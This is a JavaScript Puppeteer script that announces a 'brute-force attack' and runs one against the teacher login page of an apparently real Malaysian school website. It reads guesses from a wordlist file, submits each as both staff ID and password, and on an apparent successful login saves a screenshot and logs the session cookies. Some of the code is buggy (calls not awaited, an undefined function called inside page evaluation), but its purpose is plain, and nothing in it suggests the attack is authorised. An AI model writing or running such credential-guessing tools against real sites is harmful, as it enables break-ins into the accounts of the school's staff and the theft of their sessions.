const puppeteer = require('puppeteer');
const fs = require('fs').promises;
const path = require('path');
const { report } = require('process');
const filePath = path.join(__dirname, 'combinations.txt');

let combinations

(async () => {

    console.info("Loading wordlist from fs...")
    const data = await fs.readFile(filePath, 'utf8');
    combinations = data.split('\n');

    console.info("Wordlist loaded! Launching puppeteer...")

    const browser = await puppeteer.launch();
    const page = await browser.newPage();

    await page.setViewport({ width: 1280, height: 720 });

    await page.goto('https://mrsmgemencheh.edu.my/skoq/contents/loginguru.asp');

    await page.waitForSelector('body > table > tbody > tr > td > table > tbody > tr:nth-child(2) > td > div > img')

    console.info('Page loaded! Starting brute-force attack now!')

    for (i = 0; i < 2; i++) {
        passkey = combinations[i]
        tryLogin(page, passkey, browser)
        console.log("Current keypass: " + String(passkey))
    }
})();

async function tryLogin(page, passkey, browser) {

    async function report() {
        console.log(passkey)

        await page.screenshot({
            path: `screenshot-${passkey}.jpg`
        });

        let cookies = await page.cookies()

        console.log(cookies.values)


        await browser.close();
    }

    await page.type('#txtNoGaji', '');

    await page.type('#txtNoGaji', String(passkey));

    await page.type('#txtPwd', '')

    await page.type('#txtPwd', String(passkey))

    await page.select('#cboTahun', '2020')

    await page.click('#frmLogin > table > tbody > tr:nth-child(2) > td:nth-child(4) > input[type=submit]')


    await page.evaluate(() => {
        let el = document.querySelector("body > table > tbody > tr > td > p.style10 > img")
        return el ? el.innerText : report()
    })
        

    await page.goBack()

    await page.waitForNavigation()
      
}



